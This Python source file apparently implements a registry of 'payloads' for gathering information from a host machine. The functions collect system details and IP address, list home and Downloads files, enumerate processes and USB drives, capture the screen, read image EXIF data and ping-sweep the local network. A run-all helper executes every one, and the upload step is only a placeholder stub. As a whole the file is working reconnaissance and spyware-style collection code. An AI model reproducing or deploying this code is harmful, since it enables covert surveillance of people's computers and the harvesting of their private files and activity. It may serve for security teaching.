import os
import platform
import socket
import subprocess
import psutil
import pyautogui
from PIL import Image
from PIL.ExifTags import TAGS
import tempfile

# -----------------------------
# Payload Functions
# -----------------------------

def system_info():
    return f"""
OS: {platform.system()} {platform.release()}
Version: {platform.version()}
Hostname: {socket.gethostname()}
IP Address: {socket.gethostbyname(socket.gethostname())}
"""


def file_access():
    downloads = os.path.join(os.path.expanduser("~"), "Downloads")
    home = os.path.expanduser("~")

    files = []
    if os.path.exists(downloads):
        files.append(f"\n[Downloads]\n" + "\n".join(os.listdir(downloads)))
    if os.path.exists(home):
        files.append(f"\n[Home Directory]\n" + "\n".join(os.listdir(home)[:20]))  # limit output

    return "\n".join(files)


def folder_listing(folder_path=None):
    if folder_path is None:
        folder_path = os.getcwd()  # Default: current working directory
    try:
        return f"\n[Folder Listing: {folder_path}]\n" + "\n".join(os.listdir(folder_path))
    except Exception as e:
        return f"[!] Error listing folder: {e}"


def running_processes():
    processes = []
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        processes.append(f"{proc.info['pid']} - {proc.info['name']}")
    return "\n".join(processes[:30])  # limit to 30 for readability


def usb_detection():
    usb_list = []
    partitions = psutil.disk_partitions(all=False)
    for p in partitions:
        if "removable" in p.opts or "cdrom" in p.opts:
            usb_list.append(f"{p.device} - {p.mountpoint}")
    return "\n".join(usb_list) if usb_list else "No USB devices detected."


def screenshot():
    try:
        tmp_file = os.path.join(tempfile.gettempdir(), "screenshot.png")
        img = pyautogui.screenshot()
        img.save(tmp_file)
        return f"Screenshot saved at {tmp_file}"
    except Exception as e:
        return f"[!] Screenshot failed: {e}"


def exif_data(image_path=None):
    if image_path is None:
        image_path = "sample.jpg"  # Default fallback image
    if not os.path.exists(image_path):
        return f"Image {image_path} not found."
    try:
        img = Image.open(image_path)
        exif = img._getexif()
        if not exif:
            return "No EXIF metadata found."
        return "\n".join([f"{TAGS.get(tag)}: {value}" for tag, value in exif.items() if tag in TAGS])
    except Exception as e:
        return f"[!] Error reading EXIF data: {e}"


def network_scan():
    try:
        hosts = []
        ip_base = ".".join(socket.gethostbyname(socket.gethostname()).split(".")[:-1]) + "."
        for i in range(1, 10):  # Scan first 10 IPs
            ip = ip_base + str(i)
            result = subprocess.run(
                ["ping", "-n", "1", "-w", "200", ip] if platform.system().lower() == "windows"
                else ["ping", "-c", "1", "-W", "1", ip],
                capture_output=True, text=True
            )
            if "TTL=" in result.stdout or "ttl=" in result.stdout:
                hosts.append(ip)
        return "\n".join(hosts) if hosts else "No live hosts detected."
    except Exception as e:
        return f"[!] Network scan error: {e}"


def upload_demo():
    return "Simulated upload: [Payload data would be sent to server here]"


# -----------------------------
# Payload Registry
# -----------------------------
PAYLOADS = {
    "system_info":    ("System Info", system_info),
    "file_access":    ("File Access", file_access),
    "folder_listing": ("Folder Listing", folder_listing),
    "processes":      ("Running Processes", running_processes),
    "usb":            ("USB Detection", usb_detection),
    "screenshot":     ("Screenshot", screenshot),
    "exif":           ("EXIF Data", exif_data),
    "network":        ("Network Scan", network_scan),
    "upload":         ("Upload (Demo)", upload_demo),
}


# -----------------------------
# Helpers
# -----------------------------

def list_payloads():
    lines = []
    for key, (desc, _) in PAYLOADS.items():
        lines.append(f"{key:14} - {desc}")
    return "\n".join(lines)


def run_payload(name, *args, **kwargs):
    if name not in PAYLOADS:
        raise ValueError(f"Unknown payload: {name}")
    return PAYLOADS[name][1](*args, **kwargs)


def run_all_payloads(**kwargs):
    """Run all registered payloads and return results as a dictionary."""
    results = {}
    for name, (_, func) in PAYLOADS.items():
        try:
            if name == "folder_listing":
                result = func(kwargs.get("folder_path", None))
            elif name == "exif":
                result = func(kwargs.get("image_path", None))
            else:
                result = func()
            results[name] = result
        except Exception as e:
            results[name] = f"[!] Error running {name}: {e}"
    return results
